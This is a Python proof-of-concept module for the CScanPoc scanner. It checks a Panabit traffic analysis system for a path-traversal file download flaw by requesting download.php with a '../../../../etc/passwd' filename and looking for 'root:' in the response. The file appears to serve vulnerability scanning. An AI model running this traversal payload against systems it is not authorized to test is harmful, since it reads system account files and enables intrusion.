# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re
import urllib.parse


class Vuln(ABVuln):
    vuln_id = 'Panabit_0001'  # 平台漏洞编号，留空
    name = '派网软件某流量分析管理系统 任意文件下载'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.FILE_TRAVERSAL  # 漏洞类型
    disclosure_date = '2015-08-27'  # 漏洞公布时间
    desc = '''
        派网软件（Panabit）某流量分析管理系统任意文件遍历:http://foorbar/download.php?filename=../../../../etc/passwd
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=0136721、0114137'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '派网软件'  # 漏洞应用名称
    product_version = '派网软件某流量分析管理系统'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '19eadb6e-7173-4c7f-8540-7a05af629c46'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-25'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # refer: http://www.wooyun.org/bugs/wooyun-2010-0136721
            # refer: http://wooyun.org/bugs/wooyun-2010-0114137
            hh = hackhttp.hackhttp()
            arg = self.target
            # 任意文件遍历
            payload = arg + '/download.php?filename=../../../../etc/passwd'
            code, head, res, err, _ = hh.http(payload)

            if code == 200 and 'root:' in res:
                #security_hole('Arbitrarilly file download: ' + payload)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
